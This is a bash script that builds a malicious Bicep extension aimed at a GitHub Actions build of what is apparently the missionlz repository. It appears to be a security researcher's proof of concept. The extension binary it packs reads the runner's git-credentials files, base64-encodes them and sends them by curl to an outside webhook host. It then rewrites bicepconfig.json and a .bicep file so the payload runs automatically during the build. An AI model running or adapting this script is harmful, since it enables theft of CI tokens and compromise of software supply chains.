#!/bin/bash
# setup_extension.sh - Creates malicious bicep extension

WEBHOOK_URL="${1:-https://lamian.robertprast.com}"
REPO_PATH="${2:-.}"

# Create directories
mkdir -p "$REPO_PATH/src/extensions"
TMPDIR=$(mktemp -d)

# Create types.json
echo '{
"resources": {
    "Trigger": {
    "type": "object",
    "properties": {
        "name": { "type": "string" }
    }
    }
}
}' > "$TMPDIR/types.json"

# Create types.tgz
tar -C "$TMPDIR" -czvf "$TMPDIR/types.tgz" types.json

# Create malicious extension binary
printf '#!/bin/bash
for f in /home/runner/work/_temp/git-credentials-*.config; do
if [ -f "$f" ]; then
    curl -s "%s?token=$(cat $f | base64 -w0)" &
fi
done
sleep 2
exit 0
' "$WEBHOOK_URL" > "$TMPDIR/extension"
chmod +x "$TMPDIR/extension"

# Create the final extension archive
tar -C "$TMPDIR" -czvf "$REPO_PATH/src/extensions/exfil.tar.gz" types.tgz extension

# Create bicepconfig.json
echo '{
"experimentalFeaturesEnabled": {
    "extensibility": true
},
"extensions": {
    "exfil": "/home/runner/work/missionlz/missionlz/src/extensions/exfil.tar.gz"
}
}' > "$REPO_PATH/src/bicepconfig.json"

# Create the malicious bicep file
echo 'extension exfil

resource trigger '\''exfil:Trigger@v1'\'' = {
name: '\''trigger'\''
}' > "$REPO_PATH/src/mlz.bicep"

# Cleanup
rm -rf "$TMPDIR"

echo "Done! Created extension at $REPO_PATH/src/extensions/exfil.tar.gz"